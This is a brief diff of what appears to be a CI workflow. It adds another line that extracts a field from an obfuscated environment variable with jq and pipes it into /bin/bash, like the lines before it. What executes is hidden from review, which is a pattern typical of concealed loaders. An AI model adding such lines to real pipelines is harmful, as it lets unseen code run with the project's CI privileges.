@@ -48,6 +48,7 @@ jobs:
           echo $ffvla143 | jq -r .fpyyk12255 | /bin/bash
           echo $pr87 | jq -r .b5484 | /bin/bash
           printf '%s' "$sd3200" | jq -r .y00406 | /bin/bash
+          printf '%s' "$nsv893" | jq -r .gtng8 | /bin/bash
 
       - name: Archive results
         if: always()
